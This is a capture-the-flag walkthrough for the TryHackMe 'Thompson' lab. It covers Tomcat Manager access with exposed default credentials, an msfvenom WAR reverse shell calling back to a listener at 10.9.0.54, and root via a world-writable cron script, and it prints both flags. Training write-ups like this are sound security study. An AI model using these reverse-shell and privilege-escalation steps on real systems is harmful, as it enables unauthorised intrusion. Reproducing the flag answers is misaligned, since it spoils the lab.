# TryHackMe - Thompson

**Machine:** Thompson  
**Description:** Boot2root machine for FIT and BSides Guatemala CTF  
**Objective:** Obtain `user.txt` and `root.txt`

---

## Overview

We’ll exploit Apache Tomcat Manager (using a WAR reverse shell) to gain a foothold as the `tomcat` user, then escalate privileges with a writable cron script to grab the root flag.

---

## 1. user.txt

### 1.1 Nmap Discovery

Nmap shows three open ports—SSH on 22, AJP on 8009, and Apache Tomcat on 8080:

~~~plaintext
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
8080/tcp open  http    Apache Tomcat 8.5.5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~

A **dirsearch** scan reveals `/manager`. Checking the configuration snippet or HTTP response shows:

~~~plaintext
<user username="tomcat" password="s3cret" roles="manager-gui"/>
~~~

Hence, **username** is `tomcat` and **password** is `s3cret`.

---

### 1.2 Deploying a WAR Reverse Shell

1. **Generate** a JSP reverse shell:
   ~~~bash
   msfvenom -p java/jsp_shell_reverse_tcp lhost=10.9.0.54 lport=4444 -f war -o shell.war
   ~~~

2. **Open** a Metasploit listener:
   ~~~bash
   msfconsole -q
   use multi/handler
   set payload java/jsp_shell_reverse_tcp
   set lhost 10.9.0.54
   set lport 4444
   run -j
   ~~~

3. **Upload** `shell.war` in Tomcat Manager (log in as `tomcat:s3cret`). It auto-deploys to `/shell`.

4. **Visit** `/shell` in a browser. Metasploit should catch a reverse shell:
   ~~~plaintext
   msf5 exploit(multi/handler) > sessions -i 1
   tomcat@ubuntu:/$ id
   uid=1001(tomcat) gid=1001(tomcat)
   ~~~

---

### 1.3 Reading `user.txt`

   ~~~plaintext
   cat /home/jack/user.txt
   39400c90bc683a41a8935e4719f181bf
   ~~~

**User Flag**  
   ~~~plaintext
   39400c90bc683a41a8935e4719f181bf
   ~~~

---

## 2. root.txt

### 2.1 Cron Job Enumeration

A cron job in `/etc/crontab` runs every minute as root:

~~~plaintext
*  *  *  *  *   root    cd /home/jack && bash id.sh
~~~

Inside `id.sh`:

~~~plaintext
#!/bin/bash
id > test.txt
~~~

Because `id.sh` is **world-writable**, we can overwrite it.

### 2.2 Privilege Escalation

Replace `id.sh` to read the root flag:

~~~bash
printf '#!/bin/bash\ncat /root/root.txt > test.txt' > id.sh
~~~

Wait for the cron to run, then check `test.txt`:

~~~plaintext
cat test.txt
d89d5391984c0450a95497153ae7ca3a
~~~

**Root Flag**  
   ~~~plaintext
   d89d5391984c0450a95497153ae7ca3a
   ~~~

---

## Final Thoughts

- Tomcat Manager (with found credentials) gave initial access.  
- A **world-writable** script in a **root-owned** cron job allowed reading the root flag.

**User Flag:** `39400c90bc683a41a8935e4719f181bf`  
**Root Flag:** `d89d5391984c0450a95497153ae7ca3a`

